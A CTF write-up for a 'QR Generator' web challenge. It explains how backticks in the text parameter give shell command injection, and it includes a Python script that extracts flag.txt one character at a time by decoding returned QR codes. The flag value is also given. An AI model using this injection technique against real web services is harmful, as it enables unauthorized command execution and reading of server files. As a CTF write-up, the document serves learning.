# QR Generator

Website is simple: we input, it goes to a url and uses it to generate a QR code of what we input. Sadly, only the first character of what we input gets QR coded. More on this later.

I decided to cut out the middle man and go straight to `/qr?text=<insert text here>` for ease. I found when putting backticks inside of the text it errored.

A little research tells you that backticks are used for shells within a shell in php and bash. So there's probably some horribly filtered system or eval commands going on there that allow us to execute code using `<command>`.

We find that the output of the command is actually stored in the qr code! Hazzah! cat flag.txt it is!

Except...

It still only takes the first character.

I wrote a nice little script that uses tail to grab bytes of the flag at different positions, automating the qr code scan using zbarimg.

### Note: I knew it must be in the cat flag.txt because

* It didn't error like some other commands did
* The first two characters were rt, so I took a wild guess.

```python
import requests, os, re
flag = ''
def urlencode(text):
    output = ''
    for char in text:
        output += '%' + hex(ord(char))[2:].upper()
    return output
i = 1
while '}' not in flag:
    try:
        payload = f"` tail -c +{i} flag.txt `"
        enc = urlencode(payload)
        url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=" + enc
        os.system(f"wget {url} -O temp.png")
        char = os.popen("zbarimg temp.png").read().split('\n')[0]
        realchar = re.findall("QR-Code:(.*)", char)[0]
        flag += realchar
    except:
        print(flag)
        quit()
    finally:
        i += 1
print("FLAG ACQUIRED!")
print(flag)
```

## rtcp{fl4gz\_1n\_qr\_c0d3s???\_b1c3fea}

